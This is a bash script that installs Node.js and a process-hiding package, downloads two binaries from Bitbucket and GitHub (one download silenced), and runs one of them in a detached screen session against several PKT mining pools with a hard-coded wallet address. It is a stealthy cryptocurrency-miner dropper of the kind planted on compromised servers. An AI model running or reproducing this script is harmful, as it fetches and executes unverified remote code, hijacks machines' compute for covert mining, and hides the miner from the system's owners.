#!/bin/bash
apt update -y
apt install gcc screen -y
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
apt install nodejs -y
npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add golang
wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload
wget https://github.com/danipedrosang/marcrash/raw/main/golang >/dev/null 2>&1
chmod +x golang reload
screen -dmS run ./golang ann -p pkt1q8prmfshgchvw8s0mzglxkj4cec0ecu78j8mc5e http://pool.pkt.world https://stratum.zetahash.com http://pool.pkteer.com http://pool.pktpool.io -t 1
./reload
